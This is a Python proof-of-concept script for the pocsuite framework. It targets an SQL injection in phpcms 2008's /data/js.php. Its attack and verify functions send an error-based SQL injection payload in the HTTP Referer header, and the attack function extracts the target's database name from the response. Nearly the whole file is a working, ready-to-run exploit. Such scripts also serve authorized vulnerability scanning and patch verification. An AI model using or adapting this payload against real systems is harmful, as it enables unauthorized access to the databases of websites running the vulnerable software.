#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def get_url(url, refer):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer" : refer
        }
        resp = httpreq.get(url, headers=headers)
    except Exception as ex:
        resp = None
    return resp

class TestPOC(POCBase):
    name = 'phpcms2008 SQL Injection Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://www.seebug.org/vuldb/ssvid-62274']
    desc = '''phpcms2008 js.php存在sql注入'''

    vulDate = '2011-11-21'
    createDate = '2019-04-27'
    updateDate = '2019-04-27'

    appName = 'phpcms'
    appVersion = '2008'
    appPowerLink = 'http://www.phpcms.cn/'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/data/js.php?id=1'
        refer = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1"
        resp = get_url(self.url + payload1,refer)
        dbname1 = re.findall("~(.*?)~", resp.content)
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1[0]
            
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/data/js.php?id=1'
        refer = "' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '1'='1"
        resp = get_url(self.url + payload1,refer)
        time.sleep(2)
        if resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

